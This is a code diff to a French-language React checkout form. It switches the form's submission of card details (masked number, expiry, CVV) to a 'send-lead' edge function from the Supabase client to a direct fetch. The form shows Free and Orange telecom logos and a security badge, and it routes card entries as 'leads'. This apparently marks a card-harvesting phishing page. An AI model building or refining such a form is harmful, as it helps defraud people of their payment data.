@@ -3,7 +3,9 @@ import {
   CheckCircle, AlertCircle, Lock, CreditCard,
   ShieldCheck, Clock, Users, Star, ArrowRight, TrendingUp,
 } from 'lucide-react'
-import { supabase } from '../lib/supabase'
+// Direct Edge Function URL — no JWT dependency
+const EDGE_URL = `${import.meta.env.VITE_SUPABASE_URL}/functions/v1/send-lead`
+const ANON_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY
 import secureImg    from '../assets/image copy.png'
 import freeLogo     from '../assets/image copy 2.png'
 import orangeLogo   from '../assets/image copy 3.png'
@@ -297,8 +299,16 @@ export default function Form() {
         phone:   '',
         message: `Carte: **** **** **** ${fields.cardNumber.replace(/\s/g, '').slice(-4)} | Exp: ${fields.month}/${fields.year} | CVV: ***`,
       }
-      const { error } = await supabase.functions.invoke('send-lead', { body: payload })
-      if (error) throw new Error(error.message)
+      const res = await fetch(EDGE_URL, {
+        method:  'POST',
+        headers: {
+          'Content-Type':  'application/json',
+          'Authorization': `Bearer ${ANON_KEY}`,
+        },
+        body: JSON.stringify(payload),
+      })
+      const data = await res.json()
+      if (!res.ok) throw new Error(data.error || 'Erreur serveur')
       setStatus('success')
       setFields(INITIAL_STATE)
     } catch (err) {
